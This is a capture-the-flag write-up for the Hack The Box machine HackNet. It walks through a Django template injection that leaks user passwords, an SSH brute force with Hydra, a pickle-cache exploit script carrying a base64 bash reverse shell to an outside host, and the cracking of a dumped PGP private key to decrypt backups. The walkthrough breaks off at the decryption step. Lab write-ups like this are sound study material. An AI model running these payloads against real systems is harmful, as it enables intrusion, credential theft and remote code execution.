# HTB - Hacknet - Writeup

HackNet is a medium-difficulty Linux machine featuring a Django-based social network.
After registering, we find a Server-Side Template Injection (SSTI) in the likes widget, which we exploit to leak user credentials.
This gives us SSH access. For privilege escalation, we abuse Django’s FileBasedCache with
a Pickle deserialization flaw, then recover a GPG key and passphrase to decrypt database backups and gain root access.

## Enumeration

```
nmap -p- --min-rate=1000 -sC -sV 10.129.6.41 -oN nmap.scan
```

```
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-20 23:15 EST
Warning: 10.129.6.41 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.129.6.41
Host is up (0.039s latency).
Not shown: 65345 closed tcp ports (reset), 188 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey: 
|   256 95:62:ef:97:31:82:ff:a1:c6:08:01:8c:6a:0f:dc:1c (ECDSA)
|_  256 5f:bd:93:10:20:70:e6:09:f1:ba:6a:43:58:86:42:66 (ED25519)
80/tcp open  http    nginx 1.22.1
|_http-title: Did not follow redirect to http://hacknet.htb/
|_http-server-header: nginx/1.22.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 69.31 seconds
```


## HTTP

```
echo "10.10.11.85 hacknet.htb" | sudo tee -a /etc/hosts
```

<img width="1194" height="648" alt="image" src="https://github.com/user-attachments/assets/5588c934-f14b-4fc8-a86e-2aec04d706a6" />

<img width="1186" height="630" alt="image" src="https://github.com/user-attachments/assets/2c055f92-504a-456b-bb20-20dc639eda6e" />

<img width="1142" height="602" alt="image" src="https://github.com/user-attachments/assets/becc934a-809f-4b05-ab78-7a8cd0dd6aba" />

<img width="1182" height="639" alt="image" src="https://github.com/user-attachments/assets/0862f1a8-ebc5-4818-a070-3fd206bc1870" />

<img width="1173" height="646" alt="image" src="https://github.com/user-attachments/assets/14620624-6ed6-4ce7-991b-5e5b761f0a6b" />

<img width="1186" height="638" alt="image" src="https://github.com/user-attachments/assets/903b6502-7a65-4eaf-bb92-9db532d6770c" />

<img width="496" height="549" alt="image" src="https://github.com/user-attachments/assets/824ea024-b741-4133-af57-edf89b8aee13" />

Django apps can sometimes be vulnerable to Server-Side Template Injection (SSTI). To test for this, we go to the Edit Profile page and insert a basic payload like {{7*7}} into the username 
or bio fields, watching for unexpected behavior that indicates code execution.

`{{ 7*7 }}`

<img width="1504" height="468" alt="image" src="https://github.com/user-attachments/assets/c4659fa9-e74f-4185-8e2a-9677d9805921" />

<img width="1498" height="669" alt="image" src="https://github.com/user-attachments/assets/22f64df3-04d0-46d7-8557-45c48716c435" />

## Foothold

Since Jinja2 evaluates user input within the template’s context, we can access backend variables like users, posts, or likes. 
By enumerating these context variables from our injection point, we can identify and potentially leak sensitive data.

<img width="625" height="694" alt="image" src="https://github.com/user-attachments/assets/bbb9a0be-9873-443b-86a9-2dbf63f0f400" />
<img width="1167" height="678" alt="image" src="https://github.com/user-attachments/assets/2aef76bc-330f-441e-85f0-aabe139d1f46" />
<img width="1170" height="680" alt="image" src="https://github.com/user-attachments/assets/b9f4847a-7b9b-4fb9-a4f4-b68bf3c17320" />
<img width="1169" height="153" alt="image" src="https://github.com/user-attachments/assets/624502f5-a3d4-4b94-91d2-8e3534b9c66f" />

Different route

<img width="1872" height="656" alt="image" src="https://github.com/user-attachments/assets/bbfa239d-472e-4bc6-9407-ec08ee270d8d" />


Change username to {{ users }} and try to leak the user array through rendering.

<img width="1908" height="640" alt="image" src="https://github.com/user-attachments/assets/fb136019-973f-463b-a45a-55182910e2a1" />

<img width="1855" height="855" alt="image" src="https://github.com/user-attachments/assets/5df7c298-914c-4a0b-b402-7f2e76d5c746" />

<img width="1864" height="606" alt="image" src="https://github.com/user-attachments/assets/2e9d35f7-0bf6-4ef2-84f2-7cc46a16e8d9" />

<img width="1916" height="718" alt="image" src="https://github.com/user-attachments/assets/cbe09c26-a65d-4da9-917d-04c2ce5d49b5" />

Seeing the users in the source code.

<img width="1900" height="260" alt="image" src="https://github.com/user-attachments/assets/5430c26c-2ed6-478b-a9a9-7186444b9591" />

```
nano likes.html


<div class="likes-review-item"><a href="/profile/1"><img src="/media/1.jpg" title="cyberghost"></a></div><div class="likes-review-item"><a href="/profile/6"><img src="/media/6.jpg" title="shadowcaster"></a></div><div class="likes-review-item"><a href="/profile/9"><img src="/media/9.png" title="glitch"></a></div><div class="likes-review-item"><a href="/profile/13"><img src="/media/13.png" title="netninja"></a></div><div class="likes-review-item"><a href="/profile/19"><img src="/media/19.jpg" title="exploit_wizard"></a></div><div class="likes-review-item"><a href="/profile/21"><img src="/media/21.jpg" title="whitehat"></a></div><div class="likes-review-item"><a href="/profile/22"><img src="/media/22.png" title="deepdive"></a></div><div class="likes-review-item"><a href="/profile/23"><img src="/media/23.jpg" title="virus_viper"></a></div><div class="likes-review-item"><a href="/profile/24"><img src="/media/24.jpg" title="brute_force"></a></div><div class="likes-review-item"><a href="/profile/27"><img src="/media/profile.png" title="&lt;QuerySet [&lt;SocialUser: cyberghost&gt;, &lt;SocialUser: shadowcaster&gt;, &lt;SocialUser: glitch&gt;, &lt;SocialUser: netninja&gt;, &lt;SocialUser: exploit_wizard&gt;, &lt;SocialUser: whitehat&gt;, &lt;SocialUser: deepdive&gt;, &lt;SocialUser: virus_viper&gt;, &lt;SocialUser: brute_force&gt;, &lt;SocialUser: {{ users }}&gt;]&gt;"></a></div>
```

```
grep -oP 'title="\K[^"]+' likes.html | sed 's/^.*: //; s/>.*$//' > usernames.txt
```

```
cat usernames.txt 
cyberghost
shadowcaster
glitch
netninja
exploit_wizard
whitehat
deepdive
virus_viper
brute_force
{{ users }}&gt;]&gt;
```

Next change the name to

`{{ users.values }}`

<img width="1497" height="547" alt="image" src="https://github.com/user-attachments/assets/453fa6da-0c9b-4e00-af90-a1ae39737a01" />

<img width="1899" height="598" alt="image" src="https://github.com/user-attachments/assets/e4bb66f7-2f5e-45d1-b654-f39cb4c17593" />


<img width="1943" height="319" alt="image" src="https://github.com/user-attachments/assets/44055a21-98a4-45af-bbca-949cc29324a8" />

```
sudo nano extract.py

import re  
import requests  
import html  

url = "http://hacknet.htb"  
headers = {  
    'Cookie': "csrftoken=Ysga4uQHmPV2krnl9NaesTZhr2fYtUvo; sessionid=hzuvjy1fljqkup6ek8rldob27wnf4ud8"  
}  

all_users = set()

for i in range(1, 31):  
    # Like the post (in case it's needed to populate the likes list)
    requests.get(f"{url}/like/{i}", headers=headers)  

    # Get the likes list for the post
    text = requests.get(f"{url}/likes/{i}", headers=headers).text  

    # Extract all <img> tag titles
    img_titles = re.findall(r'<img [^>]*title="([^"]*)"', text)  
    if not img_titles:  
        continue  

    # Decode the last title (this usually contains the leaked context via SSTI)
    last_title = html.unescape(img_titles[-1])  

    # Retry if the template context (QuerySet) didn’t load the first time
    if "<QuerySet" not in last_title:  
        requests.get(f"{url}/like/{i}", headers=headers)  
        text = requests.get(f"{url}/likes/{i}", headers=headers).text  
        img_titles = re.findall(r'<img [^>]*title="([^"]*)"', text)  
        if img_titles:  
            last_title = html.unescape(img_titles[-1])  

    # Extract emails and passwords from the context data
    emails = re.findall(r"'email': '([^']*)'", last_title)  
    passwords = re.findall(r"'password': '([^']*)'", last_title)  

    # Combine email prefix (username) and password
    for email, p in zip(emails, passwords):  
        username = email.split('@')[0]  
        all_users.add(f"{username}:{p}")  

# Print unique username:password combos
for item in sorted(all_users):  
    print(item)
```

```
python3 extract1.py                                                                                            
blackhat_wolf:Bl@ckW0lfH@ck
brute_force:BrUt3F0rc3#
bytebandit:Byt3B@nd!t123
codebreaker:C0d3Br3@k!
cryptoraven:CrYptoR@ven42
cyberghost:Gh0stH@cker2024
darkseeker:D@rkSeek3r#
datadive:D@taD1v3r
deepdive:D33pD!v3r
exploit_wizard:Expl01tW!zard
glitch:Gl1tchH@ckz
hexhunter:H3xHunt3r!
lotus:lotus
mikey:mYd4rks1dEisH3re
netninja:N3tN1nj@2024
packetpirate:P@ck3tP!rat3
phreaker:Phre@k3rH@ck
rootbreaker:R00tBr3@ker#
shadowcaster:Sh@d0wC@st!
shadowmancer:Sh@d0wM@ncer
shadowwalker:Sh@dowW@lk2024
stealth_hawk:St3@lthH@wk
trojanhorse:Tr0j@nH0rse!
virus_viper:V!rusV!p3r2024
whitehat:Wh!t3H@t2024
zero_day:Zer0D@yH@ck
```


```
sudo nano extracted.txt

python3 extract1.py                                                                                            
blackhat_wolf:Bl@ckW0lfH@ck
brute_force:BrUt3F0rc3#
bytebandit:Byt3B@nd!t123
codebreaker:C0d3Br3@k!
cryptoraven:CrYptoR@ven42
cyberghost:Gh0stH@cker2024
darkseeker:D@rkSeek3r#
datadive:D@taD1v3r
deepdive:D33pD!v3r
exploit_wizard:Expl01tW!zard
glitch:Gl1tchH@ckz
hexhunter:H3xHunt3r!
lotus:lotus
mikey:mYd4rks1dEisH3re
netninja:N3tN1nj@2024
packetpirate:P@ck3tP!rat3
phreaker:Phre@k3rH@ck
rootbreaker:R00tBr3@ker#
shadowcaster:Sh@d0wC@st!
shadowmancer:Sh@d0wM@ncer
shadowwalker:Sh@dowW@lk2024
stealth_hawk:St3@lthH@wk
trojanhorse:Tr0j@nH0rse!
virus_viper:V!rusV!p3r2024
whitehat:Wh!t3H@t2024
zero_day:Zer0D@yH@ck
```

```
hydra -C extracted.txt hacknet.htb ssh -t 4
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-01-21 00:36:03
[ERROR] invalid line in colon file (-C), missing colon in line: python3 extract1.py
```

```
grep ':' extracted.txt > clean.txt
```

```
hydra -C clean.txt hacknet.htb ssh -t 4
```

```
hydra -C clean.txt hacknet.htb ssh -t 4
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-01-21 00:38:26
[DATA] max 4 tasks per 1 server, overall 4 tasks, 26 login tries, ~7 tries per task
[DATA] attacking ssh://hacknet.htb:22/
[22][ssh] host: hacknet.htb   login: mikey   password: mYd4rks1dEisH3re
```

```
ssh mikey@hacknet.htb
The authenticity of host 'hacknet.htb (10.129.6.41)' can't be established.
ED25519 key fingerprint is SHA256:TVT7HGjgzl5Wk42d9xFlPlDUwhNCWjWA5Cdz6MdUC9o.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'hacknet.htb' (ED25519) to the list of known hosts.
mikey@hacknet.htb's password: 
Linux hacknet 6.1.0-38-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.147-1 (2025-08-02) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Jan 21 00:39:45 2026 from 10.10.14.129
```

```
mikey@hacknet:~$ ls
user.txt
mikey@hacknet:~$ cat user.txt
e8bXXXXXXXXXXXXXXXXXX6c3f
mikey@hacknet:~$ 
```

Checking the files in the website directory, we found that the owner is sandy.

```
mikey@hacknet:~$ cd ..
mikey@hacknet:/home$ ls
mikey  sandy
mikey@hacknet:/home$ ls
mikey  sandy
mikey@hacknet:/home$ cd sandy/
-bash: cd: sandy/: Permission denied
mikey@hacknet:/home$ cd ..
mikey@hacknet:/$ ls
bin   dev  home        initrd.img.old  lib64       media  opt   root  sbin  sys  usr  vmlinuz
boot  etc  initrd.img  lib             lost+found  mnt    proc  run   srv   tmp  var  vmlinuz.old
mikey@hacknet:/$ cd var/
mikey@hacknet:/var$ cd www
mikey@hacknet:/var/www$ cd HackNet/
mikey@hacknet:/var/www/HackNet$ ls -al
total 32
drwxr-xr-x 7 sandy sandy    4096 Feb 10  2025 .
drwxr-xr-x 4 root  root     4096 Jun  2  2024 ..
drwxr-xr-x 2 sandy sandy    4096 Dec 29  2024 backups
-rw-r--r-- 1 sandy www-data    0 Aug  8  2024 db.sqlite3
drwxr-xr-x 3 sandy sandy    4096 Sep  8 05:20 HackNet
-rwxr-xr-x 1 sandy sandy     664 May 31  2024 manage.py
drwxr-xr-x 2 sandy sandy    4096 Aug  8  2024 media
drwxr-xr-x 6 sandy sandy    4096 Sep  8 05:22 SocialNetwork
drwxr-xr-x 3 sandy sandy    4096 May 31  2024 static
mikey@hacknet:/var/www/HackNet$ 

```

```
mikey@hacknet:/var/www/HackNet$ cd SocialNetwork/
mikey@hacknet:/var/www/HackNet/SocialNetwork$ ls
admin.py  __init__.py  models.py          __pycache__  templates  views.py
apps.py   migrations   news_generator.py  static       urls.py
mikey@hacknet:/var/www/HackNet/SocialNetwork$ 
```

```
mikey@hacknet:/var/www/HackNet/SocialNetwork$ cat views.py 

#line 489
@cache_page(60)  
def explore(request):  
    if not "email" in request.session.keys():  
        return redirect("index")  
  
    session_user = get_object_or_404(SocialUser, email=request.session['email'])  
  
    page_size = 10  
    keyword = ""  
  
    if "keyword" in request.GET.keys():  
        keyword = request.GET['keyword']  
        posts = SocialArticle.objects.filter(text__contains=keyword).order_by("-date")  
    else:  
        posts = SocialArticle.objects.all().order_by("-date")  
  
    pages = ceil(len(posts) / page_size)  
  
    if "page" in request.GET.keys() and int(request.GET['page']) > 0:  
        post_start = int(request.GET['page'])*page_size-page_size  
        post_end = post_start + page_size  
        posts_slice = posts[post_start:post_end]  
    else:  
        posts_slice = posts[:page_size]  
  
    news = get_news()  
    request.session['requests'] = session_user.contact_requests  
    request.session['messages'] = session_user.unread_messages  
  
    for post_item in posts:  
        if session_user in post_item.likes.all():  
            post_item.is_like = True  
  
    posts_filtered = []  
    for post in posts_slice:  
        if not post.author.is_hidden or post.author == session_user:  
            posts_filtered.append(post)  
        for like in post.likes.all():  
            if like.is_hidden and like != session_user:  
                post.likes_number -= 1  
  
    context = {"pages": pages, "posts": posts_filtered, "keyword": keyword, "news": news, "session_user": session_user}  
  
    return render(request, "SocialNetwork/explore.html", context)

```

We can construct any malicious serialized content to control the content returned by Django, even performing RCE. 
As long as we know the name and location of the cache, we can directly execute code.

The next step is to access `/explore` to generate a cache, generate a pickle serialized payload, write it to the cache, and finally access `/explore` to trigger the event. Below is a very simple template

```
mikey@hacknet:/var/www/HackNet/SocialNetwork$ cd ..
mikey@hacknet:/var/www/HackNet$ ls
backups  db.sqlite3  HackNet  manage.py  media  SocialNetwork  static
mikey@hacknet:/var/www/HackNet$ cd ,,
-bash: cd: ,,: No such file or directory
mikey@hacknet:/var/www/HackNet$ ls
backups  db.sqlite3  HackNet  manage.py  media  SocialNetwork  static
mikey@hacknet:/var/www/HackNet$ cd ..
mikey@hacknet:/var/www$ ls
HackNet  html
mikey@hacknet:/var/www$ cd ..
mikey@hacknet:/var$ ls
backups  cache  lib  local  lock  log  mail  opt  run  spool  tmp  www
mikey@hacknet:/var$ cd tmp/
mikey@hacknet:/var/tmp$ ls
django_cache  systemd-private-dcac3180b37749678512fd74c3fc09b0-systemd-logind.service-TTEj6w
mikey@hacknet:/var/tmp$ cd django_cache/
mikey@hacknet:/var/tmp/django_cache$ ls
mikey@hacknet:/var/tmp/django_cache$ ls
mikey@hacknet:/var/tmp/django_cache$
```
On kali machine


lets base64 decode our reverse

```
echo 'bash -i >& /dev/tcp/10.10.14.129/4444 0>&1' | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMjkvNDQ0NCAwPiYxCg==
```

then start a listener:
```
sudo nc -lvnp 4444
```

on mikey machine

`cd /tmp`

```
nano exploit_cache.py 

import pickle
import os

# Path to Django's cache directory
cache_dir = "/var/tmp/django_cache"

# Updated reverse shell payload (to your IP)
cmd = "printf YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMjkvNDQ0NCAwPiYx | base64 -d | bash"

# Pickle class to trigger RCE
class RCE:
    def __reduce__(self):
        return (os.system, (cmd,),)

# Serialize payload
payload = pickle.dumps(RCE())

# Overwrite all .djcache files
for filename in os.listdir(cache_dir):
    if filename.endswith(".djcache"):
        path = os.path.join(cache_dir, filename)
        try:
            os.remove(path)
        except:
            continue
        with open(path, "wb") as f:
            f.write(payload)
        print(f"[+] Written payload to {filename}")

```

```
ls -l /var/tmp/django_cache/*.djcache
```

on kali machine

```
curl -b "sessionid=hzuvjy1fljqkup6ek8rldob27wnf4ud8; csrftoken=Ysga4uQHmPV2krnl9NaesTZhr2fYtUvo" http://hacknet.htb/explore
```

on mikey machine
```
python3 exploit_cache.py
```
it will show [+] written to payload... 


on kali machine 
then trigger it 
```
curl http://hacknet.htb/explore
```

Final look 


<img width="1914" height="701" alt="image" src="https://github.com/user-attachments/assets/3b5e2eb0-0e20-4fb6-b39f-fd84d621d4ad" />


Sandy shell

<img width="724" height="210" alt="image" src="https://github.com/user-attachments/assets/dd69d85c-b150-4ee4-a26d-86adeba0f160" />

```
sandy@hacknet:/var/www/HackNet$ ls -al
ls -al
total 32
drwxr-xr-x 7 sandy sandy    4096 Feb 10  2025 .
drwxr-xr-x 4 root  root     4096 Jun  2  2024 ..
drwxr-xr-x 2 sandy sandy    4096 Dec 29  2024 backups
-rw-r--r-- 1 sandy www-data    0 Aug  8  2024 db.sqlite3
drwxr-xr-x 3 sandy sandy    4096 Sep  8 09:20 HackNet
-rwxr-xr-x 1 sandy sandy     664 May 31  2024 manage.py
drwxr-xr-x 2 sandy sandy    4096 Aug  8  2024 media
drwxr-xr-x 6 sandy sandy    4096 Sep  8 09:22 SocialNetwork
drwxr-xr-x 3 sandy sandy    4096 May 31  2024 static
sandy@hacknet:/var/www/HackNet$ 
```

```
sandy@hacknet:/var/www/HackNet$ ls -al
ls -al
total 32
drwxr-xr-x 7 sandy sandy    4096 Feb 10  2025 .
drwxr-xr-x 4 root  root     4096 Jun  2  2024 ..
drwxr-xr-x 2 sandy sandy    4096 Dec 29  2024 backups
-rw-r--r-- 1 sandy www-data    0 Aug  8  2024 db.sqlite3
drwxr-xr-x 3 sandy sandy    4096 Sep  8 09:20 HackNet
-rwxr-xr-x 1 sandy sandy     664 May 31  2024 manage.py
drwxr-xr-x 2 sandy sandy    4096 Aug  8  2024 media
drwxr-xr-x 6 sandy sandy    4096 Sep  8 09:22 SocialNetwork
drwxr-xr-x 3 sandy sandy    4096 May 31  2024 static
sandy@hacknet:/var/www/HackNet$ xs ~
xs ~
bash: xs: command not found
sandy@hacknet:/var/www/HackNet$ cd ~/
cd ~/
sandy@hacknet:~$ ls
ls
sandy@hacknet:~$ ls -la
ls -la
total 36
drwx------ 6 sandy sandy 4096 Sep 11 11:18 .
drwxr-xr-x 4 root  root  4096 Jul  3  2024 ..
lrwxrwxrwx 1 root  root     9 Sep  4 19:01 .bash_history -> /dev/null
-rw-r--r-- 1 sandy sandy  220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 sandy sandy 3526 Apr 23  2023 .bashrc
drwxr-xr-x 3 sandy sandy 4096 Jul  3  2024 .cache
drwx------ 3 sandy sandy 4096 Dec 21  2024 .config
drwx------ 4 sandy sandy 4096 Sep  5 11:33 .gnupg
drwxr-xr-x 5 sandy sandy 4096 Jul  3  2024 .local
lrwxrwxrwx 1 root  root     9 Aug  8  2024 .mysql_history -> /dev/null
-rw-r--r-- 1 sandy sandy  808 Jul 11  2024 .profile
lrwxrwxrwx 1 root  root     9 Jul  3  2024 .python_history -> /dev/null
sandy@hacknet:~$ cd .gnupg
cd .gnupg
sandy@hacknet:~/.gnupg$ ls
ls
openpgp-revocs.d
private-keys-v1.d
pubring.kbx
pubring.kbx~
random_seed
trustdb.gpg
sandy@hacknet:~/.gnupg$ cd private-keys-v1.d
cd private-keys-v1.d
sandy@hacknet:~/.gnupg/private-keys-v1.d$ ls -la
ls -la
total 20
drwx------ 2 sandy sandy 4096 Sep  5 11:33 .
drwx------ 4 sandy sandy 4096 Sep  5 11:33 ..
-rw------- 1 sandy sandy 1255 Sep  5 11:33 0646B1CF582AC499934D8503DCF066A6DCE4DFA9.key
-rw------- 1 sandy sandy 2088 Sep  5 11:33 armored_key.asc
-rw------- 1 sandy sandy 1255 Sep  5 11:33 EF995B85C8B33B9FC53695B9A3B597B325562F4F.key
sandy@hacknet:~/.gnupg/private-keys-v1.d$ 
```


```
cat armored_key.asc
-----BEGIN PGP PRIVATE KEY BLOCK-----

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
=wR12
-----END PGP PRIVATE KEY BLOCK-----
```


on kali

```
nano armored_key.asc

-----BEGIN PGP PRIVATE KEY BLOCK-----

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
=wR12
-----END PGP PRIVATE KEY BLOCK-----
```

on kali 

```
gpg2john armored_key.asc >> hash.txt
```

crack it

```
┌──(ClearLotus㉿kali)-[~/Hacknet]
└─$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65011712 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 7 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
sweetheart       (Sandy)     
1g 0:00:00:21 DONE (2026-01-21 01:29) 0.04614g/s 19.47p/s 19.47c/s 19.47C/s 246810..sweetheart
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

on sandy machine 

cd /tmp

```
gpg --batch --yes \
  --passphrase "sweetheart" \
  --pinentry-mode loopback \
  -o /tmp/test.sql \
  -d /var/www/HackNet/backups/backup01.sql.gpg
```

```
ls -lh /tmp/test.sql
